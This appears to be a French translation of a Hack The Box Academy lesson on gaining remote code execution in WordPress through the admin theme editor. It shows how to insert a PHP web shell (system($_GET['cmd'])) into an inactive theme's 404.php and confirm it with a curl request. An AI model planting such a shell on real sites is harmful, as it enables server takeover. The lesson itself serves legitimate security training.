Exécution de code à distance (RCE) via l'éditeur de thème
=========================================================

* * * * *

Attaquer le backend WordPress
-----------------------------

Avec un accès administratif à WordPress, nous pouvons modifier le code source PHP pour exécuter des commandes système. Pour effectuer cette attaque, connectez-vous à WordPress avec les informations d'identification de l'administrateur, ce qui devrait nous rediriger vers le panneau d'administration. Cliquez sur `Appearance`sur le panneau latéral et sélectionnez `Theme Editor`. Cette page nous permettra d'éditer directement le code source PHP. Nous devons sélectionner un thème inactif afin d'éviter de corrompre le thème principal.

#### Éditeur de thème

![image](https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png)

Nous pouvons voir que le thème actif est `Transportex`donc un thème inutilisé qui `Twenty Seventeen`devrait être choisi à la place.

#### Sélection d'un thème

![image](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)

Choisissez un thème et cliquez sur `Select`. Ensuite, choisissez un fichier non critique tel que `404.php`celui à modifier et ajoutez un shell Web.

#### Thème vingt dix-sept - 404.php

Code : php

```
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>

```

Le code ci-dessus devrait nous permettre d'exécuter des commandes via le paramètre GET `cmd`. Dans cet exemple, nous avons modifié le code source de la `404.php`page et ajouté une nouvelle fonction appelée `system()`. Cette fonction nous permettra d'exécuter directement les commandes du système d'exploitation en envoyant une requête GET et en ajoutant le `cmd`paramètre à la fin de l'URL après un point d'interrogation `?`et en spécifiant une commande du système d'exploitation. L'URL modifiée devrait ressembler à ceci `404.php?cmd=id`.

Nous pouvons valider que nous avons atteint le RCE en saisissant l'URL dans le navigateur Web ou en émettant la `cURL`demande ci-dessous.

#### RCE

  RCE

```
dsgsec@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
<SNIP>

```
